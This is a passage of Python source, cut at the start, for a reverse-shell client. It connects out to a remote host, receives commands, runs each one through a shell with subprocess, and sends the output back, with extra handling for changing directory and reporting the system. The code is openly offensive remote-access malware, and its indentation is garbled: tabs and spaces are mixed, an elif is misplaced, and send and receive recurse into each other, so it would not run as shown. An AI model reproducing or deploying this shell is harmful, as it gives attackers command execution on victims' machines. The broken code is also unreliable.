    try:
        s.connect((host, port))
    except:
        pass

def recieve():
    while True:
        recieve = s.recv(1024)
        if recieve == 'quit':
            s.close()

	elif recieve[:2] == 'cd':
	    try:
	        os.chdir(recieve[3:])
		args = os.getcwd()
	    except:
	        args = 'directory change error'

	elif recieve == 'system':
	    args = platform.system()

	elif recieve == 'os name':
	    args = os.name()
	
	elif recieve == 'dir':
	    args = os.getcwd()

        elif len(recieve) > 0:
            proc = subprocess.Popen(recieve, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            std_value = proc.stdout.read() + proc.stderr.read()
	    args = std_value
	
	else:
            args = 'command not recognized'

        send(args)
def send(args):
    s.send(args)
    recieve()
connect()
recieve()
s.close()

